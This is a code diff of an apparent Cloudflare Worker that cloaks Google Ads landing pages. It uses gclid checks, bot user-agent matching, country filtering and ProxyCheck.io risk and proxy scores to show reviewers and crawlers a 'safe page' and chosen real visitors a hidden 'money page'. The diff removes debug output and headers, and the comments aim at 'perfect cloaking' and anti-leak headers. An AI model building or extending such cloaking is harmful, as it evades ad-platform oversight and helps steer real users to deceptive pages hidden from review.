@@ -952,100 +952,59 @@ async function handleRequest(request) {
 
 // --- CORE FUNCTIONS ---
 
-// Global variable to store debug info for browser injection
-let debugInfo = {};
-
-async function isVisitorABot(request, debugMode = false) {
+async function isVisitorABot(request) {
   const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
   const userAgent = request.headers.get('User-Agent') || '';
   const url = new URL(request.url);
-  
-  // Reset debug info
-  debugInfo = {
-    clientIP: clientIP,
-    userAgent: userAgent,
-    gclid: url.searchParams.get('gclid'),
-    checks: []
-  };
   
   try {
     // STEP 0: Check for gclid parameter (Google Ads traffic)
     const gclid = url.searchParams.get('gclid');
     if (!gclid) {
-      debugInfo.checks.push('❌ No gclid parameter - blocked');
-      console.log('🚫 Bot detected: No gclid parameter');
       return true; // Show safe page for direct visits without gclid
     }
-    debugInfo.checks.push('✅ gclid parameter found: ' + gclid);
 
     // STEP 1: Quick user agent pattern check (fastest)
     const userAgentLower = userAgent.toLowerCase();
     for (let i = 0; i < BOT_USER_AGENTS.length; i++) {
       if (userAgentLower.includes(BOT_USER_AGENTS[i])) {
-        debugInfo.checks.push('❌ Bot user agent detected: ' + BOT_USER_AGENTS[i]);
-        console.log('🚫 Bot detected: User agent contains:', BOT_USER_AGENTS[i]);
         return true; // Show safe page for known bot user agents
       }
     }
-    debugInfo.checks.push('✅ User agent check passed');
 
     // STEP 2: Combined geo + risk check with ProxyCheck.io (supports IPv4 & IPv6)
-    const pcUrl = 'https://proxycheck.io/v2/' + clientIP + '?key=' + PROXYCHECK_API_KEY + '&risk=1&asn=1';
+         const pcUrl = 'https://proxycheck.io/v2/' + clientIP + '?key=' + PROXYCHECK_API_KEY + '&risk=1&asn=1&vpn=1';
     const response = await fetch(pcUrl);
     const data = await response.json();
     const ipData = data[clientIP];
     
-    // ✅ DEBUG: Log ProxyCheck.io response for debugging
-    console.log('🔍 ProxyCheck.io Debug - IP:', clientIP);
-    console.log('🔍 ProxyCheck.io Debug - Full Response:', JSON.stringify(data));
-    console.log('🔍 ProxyCheck.io Debug - IP Data:', JSON.stringify(ipData));
-    
-    // Store ProxyCheck.io data in debug info
-    debugInfo.proxyCheckData = ipData || null;
+
+
     
     if (ipData) {
       // Check country first (geo check) - must be from target countries
       // Use isocode (e.g., "NL") instead of country (e.g., "Netherlands") 
       if (!ipData.isocode || !TARGET_COUNTRIES.includes(ipData.isocode)) {
-        debugInfo.checks.push('❌ Country check failed. isocode: ' + ipData.isocode + ', allowed: ' + TARGET_COUNTRIES.join(','));
-        console.log('🚫 Bot detected: Country check failed. isocode:', ipData.isocode, 'TARGET_COUNTRIES:', TARGET_COUNTRIES);
         return true; // Show safe page if no country code OR not in target countries
       }
-      debugInfo.checks.push('✅ Country check passed: ' + ipData.isocode);
       
       // Only check risk score if geo passed
       if (ipData.risk !== undefined) {
         const riskScore = parseInt(ipData.risk) || 0;
-        console.log('🔍 Risk Score Check - Raw risk:', ipData.risk, 'Parsed risk:', riskScore);
-        debugInfo.checks.push('🔍 Risk score: ' + riskScore + ' (threshold: 60)');
         if (riskScore > 60) {
-          debugInfo.checks.push('❌ High risk score blocked: ' + riskScore);
-          console.log('🚫 Bot detected: High risk score:', riskScore);
           return true; // Show safe page if risk score > 60
         }
-        debugInfo.checks.push('✅ Risk score check passed');
       }
       
       // Check proxy status
       if (ipData.proxy === 'yes' || ipData.proxy === true) {
-        debugInfo.checks.push('❌ Proxy detected: ' + ipData.proxy);
-        console.log('🚫 Bot detected: Proxy detected:', ipData.proxy);
         return true; // Show safe page for proxy traffic
       }
-      debugInfo.checks.push('✅ Proxy check passed: ' + ipData.proxy);
-    } else {
-      debugInfo.checks.push('❌ No ProxyCheck.io data received');
     }
     
-    debugInfo.checks.push('✅ All checks passed - showing money page');
-    debugInfo.finalDecision = 'MONEY_PAGE';
-    console.log('✅ Visitor passed all checks - showing money page');
     return false; // Show money page for low risk visitors
 
   } catch (error) {
-    debugInfo.checks.push('❌ Error in bot detection: ' + error.message);
-    debugInfo.finalDecision = 'SAFE_PAGE (ERROR)';
-    console.log('❌ Error in bot detection:', error.message);
     return true; // Show safe page on any error
   }
 }
@@ -1053,10 +1012,9 @@ async function isVisitorABot(request, debugMode = false) {
 async function handleMainRequest(request) {
   const requestUrl = new URL(request.url);
   const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
-  const debugMode = requestUrl.searchParams.has('debug_bot');
   
   try {
-    const isBot = await isVisitorABot(request, debugMode);
+    const isBot = await isVisitorABot(request);
     
     // ✅ CRITICAL: Maintain URL path parity for perfect cloaking
     // Bots must see the EXACT same path they requested on the safe domain
@@ -1134,31 +1092,7 @@ async function handleMainRequest(request) {
         .on('link[rel="prefetch"]', new AssetRewriter(baseTargetUrl, CDN_PATH, 'href'));
     }
     
-    let transformedResponse = rewriter.transform(response);
-    
-    // ✅ DEBUG: Inject debug info into HTML when debug mode is enabled
-    if (debugMode) {
-      const originalBody = await transformedResponse.text();
-      const debugScript = \`
-<script>
-console.log('🔍 Bot Detection Debug Info:', \${JSON.stringify(debugInfo, null, 2)});
-console.log('🔍 Final Decision:', '\${isBot ? 'SAFE_PAGE' : 'MONEY_PAGE'}');
-window.botDetectionDebug = \${JSON.stringify(debugInfo, null, 2)};
-</script>
-<div id="debug-info" style="position: fixed; top: 10px; right: 10px; background: #000; color: #0f0; padding: 10px; font-family: monospace; font-size: 12px; z-index: 9999; max-width: 400px; border: 1px solid #0f0;">
-<h3>🔍 Bot Detection Debug</h3>
-<p><strong>Decision:</strong> \${isBot ? 'SAFE_PAGE' : 'MONEY_PAGE'}</p>
-<p><strong>IP:</strong> \${debugInfo.clientIP}</p>
-<p><strong>gclid:</strong> \${debugInfo.gclid || 'none'}</p>
-<div><strong>Checks:</strong><br>\${debugInfo.checks.map(check => \`• \${check}\`).join('<br>')}</div>
-</div>\`;
-      const modifiedBody = originalBody.replace('</body>', debugScript + '</body>');
-      transformedResponse = new Response(modifiedBody, {
-        status: transformedResponse.status,
-        statusText: transformedResponse.statusText,
-        headers: transformedResponse.headers
-      });
-    }
+    const transformedResponse = rewriter.transform(response);
     
     const finalResponse = new Response(transformedResponse.body, {
       status: transformedResponse.status,
@@ -1166,10 +1100,7 @@ window.botDetectionDebug = \${JSON.stringify(debugInfo, null, 2)};
       headers: transformedResponse.headers
     });
     
-    // ✅ DEBUG: Add debug headers visible in browser dev tools
-    finalResponse.headers.set('X-Debug-Bot-Decision', isBot ? 'SAFE_PAGE' : 'MONEY_PAGE');
-    finalResponse.headers.set('X-Debug-Client-IP', clientIP);
-    finalResponse.headers.set('X-Debug-Target-URL', targetUrl);
+
     
     // ✅ CRITICAL: Anti-leak headers for perfect cloaking
     finalResponse.headers.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet, noimageindex');
